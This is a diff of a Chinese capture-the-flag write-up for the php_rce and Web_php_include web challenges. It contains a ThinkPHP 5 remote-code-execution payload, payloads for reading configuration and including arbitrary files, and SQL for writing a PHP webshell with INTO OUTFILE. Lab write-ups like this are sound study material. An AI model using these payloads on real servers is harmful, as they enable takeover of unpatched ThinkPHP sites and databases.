@@ -7579,10 +7579,10 @@
 <h2 id="-web">攻防世界-web</h2>
 <p>emmm，BUU那个谷歌人机验证，好难我大概是个机器人，先做点攻防世界吧...</p>
 <h2 id="php_rce">php_rce</h2>
-<p>payload：
+<p>payload：<br />
 <code>?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</code></p>
 <p><img alt="image.png" src="../img/2hojWa3uXCdPKWYv/1595767146312-5889a26f-643c-4a07-a304-f5a07862902f-404036.png" /></p>
-<p>payload来自：<a href="https://y4er.com/post/thinkphp5-rce/">https://y4er.com/post/thinkphp5-rce/</a>
+<p>payload来自：<a href="https://y4er.com/post/thinkphp5-rce/">https://y4er.com/post/thinkphp5-rce/</a><br />
 5.0.x</p>
 <pre><code>?s=index/think\config/get&amp;name=database.username // 获取配置信息
 ?s=index/\think\Lang/load&amp;file=../../test.jpg    // 包含任意文件
@@ -7599,8 +7599,8 @@
 </code></pre>
 <h2 id="web_php_include">Web_php_include</h2>
 <p><img alt="image.png" src="../img/2hojWa3uXCdPKWYv/1595768028435-0ed11497-e69f-4426-953c-eea3cd68d1c1-274266.png" /></p>
-<p>SHOW VARIABLES LIKE "secure_file_priv" 如果是null不能写
-SELECT "php一句话" INTO OUTFILE '路径'
+<p>SHOW VARIABLES LIKE "secure_file_priv" 如果是null不能写<br />
+SELECT "php一句话" INTO OUTFILE '路径'<br />
 然后文件包含</p>
 <blockquote>
 <p>原文: <a href="https://www.yuque.com/hxfqg9/web/mi07k6">https://www.yuque.com/hxfqg9/web/mi07k6</a></p>
